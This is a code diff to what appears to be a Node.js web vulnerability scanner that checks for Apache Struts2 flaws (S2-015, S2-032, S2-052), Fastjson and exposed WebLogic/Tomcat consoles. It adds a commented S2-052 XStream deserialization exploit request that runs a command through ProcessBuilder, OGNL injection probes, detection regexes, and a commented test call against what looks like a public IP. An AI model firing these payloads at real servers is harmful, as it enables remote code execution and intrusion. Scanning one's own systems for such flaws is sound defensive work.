@@ -416,7 +416,7 @@ function fnDoBody(body,t,rep)
 	}
 	if(!body)return;
 	body = body.toString("utf8").trim();
-	var rg1 = /(__VIEWSTATEGENERATOR)/gmi;
+	var rg1 = /(__VIEWSTATEGENERATOR)|(java\.io\.InputStreamReader)|(org\.apache\.struts2\.ServletActionContext)|(\.getWriter)/gmi;
 	if(rg1.test(body) || -1 < body.indexOf("pwd%3a") || -1 < body.indexOf("echo+whoami"))return;
 
 	//console.log(body.indexOf("echo+whoami"));return;
@@ -700,7 +700,7 @@ function doStruts2_032(url)
     	function(e,r,b)
     {
     	var szTmp = String(e || b);
-    	console.log(szTmp);
+    	// console.log(szTmp);
     	if(-1 < szTmp.indexOf('1160201155512345'))
     		g_oRst.struts2 = {des:"发现s2-032高危漏洞","s2-032":"存在高危漏洞"};
     	else fnDoBody(b,"s2-032");
@@ -1042,16 +1042,16 @@ function doStruts2_015(url, fnCbk)
 		+ ",#as='{{'+#as+'}}'"
 		+ ",#as.toString()"
 		+"}";
-		request(fnOptHeader({method: 'GET',uri: url + encodeURIComponent(s) + ".action"
+		request(fnOptHeader({method: 'GET',uri: url + encodeURIComponent(s) + ".do"
 		    })
 		  , function (error, response, body){
-		  	//console.log(error||body);
+		  	// console.log(error||body);
 		  		if(body)
 		  		{
 		  			var r = /\{\{([^\}]+)\}\}/gmi.exec(body),sR = r && r[1] || "";
 		  			fnCbk1(sR.replace(/(^\s*)|(\s*$)/gmi,''));
 		  			// fnDoBody(body,"s2-015");
-		  		}else fnCbk1(szCmd + '\n');
+		  		}else fnCbk1('');
 		    }
 		  );
 	};
@@ -1063,6 +1063,7 @@ function doStruts2_015(url, fnCbk)
 		{
 			fnC(a[n],function(s)
 			{
+				console.log(s);
 				aR[n] = s;
 				nC++;
 			})
@@ -1303,7 +1304,7 @@ function testWeblogic(url,fnCbk)
 	});
 	request(fnOptHeader({method:"GET",uri:szCs}),function(e,r,b)
 	{
-		if(200 == r.statusCode)
+		if(r && 200 == r.statusCode)
 		{
 			g_oRst.weblogic = {console:"发现console可访问，不符合安全规范要求，建议关闭、设置访问限制"};
 		}
@@ -1315,6 +1316,41 @@ function testWeblogic(url,fnCbk)
 			g_oRst.tomcat = {console:"发现manager可访问，不符合安全规范要求，建议关闭、设置访问限制"};
 		}
 	});
+}
+
+/*
+POST /struts2-rest-showcase/orders/3;jsessionid=A82EAA2857A1FFAF61FF24A1FBB4A3C7 HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
+Accept: text/html,application/xhtml+xml,application/xml
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Content-Type: application/xml
+Content-Length: 1663
+Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/edit
+Cookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+<map> 
+<entry> 
+<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> 
+</entry> 
+</map> 
+*/
+function doStruts2_052(url)
+{
+	url = fnNotEnd(url);
+	var s = "";
+	var oR = fnOptHeader({method: 'GET',uri: url + "?redirectAction:" + encodeURIComponent(s)
+		});
+	oR.followAllRedirects = oR.followRedirect=true;
+	request(oR,
+    	function(e,r1,b)
+    {
+    	// var r = /\{\{([^\}]+)\}\}/gmi.exec(b.toString()),sR = r && r[1] || "";
+    	// console.log(e || b);
+    	if(!e)fnDoBody(e||b,"s2-052");
+    });
 }
 
 // 
@@ -1333,7 +1369,7 @@ function fastjson(url, fnCbk)
 	  		//console.log(error || body);
 	  		if(body)
 	  		{
-	  			fnDoBody(body,"s2-009");
+	  			fnDoBody(body,"fastjson");
 	  		}
 	    }
 	  );
@@ -1386,7 +1422,8 @@ if(program.test)
  	
 	// doStruts2_005("http://192.168.10.216:8088/S2-005/example/HelloWorld.action");
 	
-	doStruts2_032("http://192.168.10.216:8088/s2-032/memoindex.action");
+	// doStruts2_032("http://192.168.10.216:8088/s2-032/memoindex.action");
+	// doStruts2_015("http://101.89.63.203:2001/jnrst/");
 	
 	/**
 	doStruts2_009(g_szUrl);
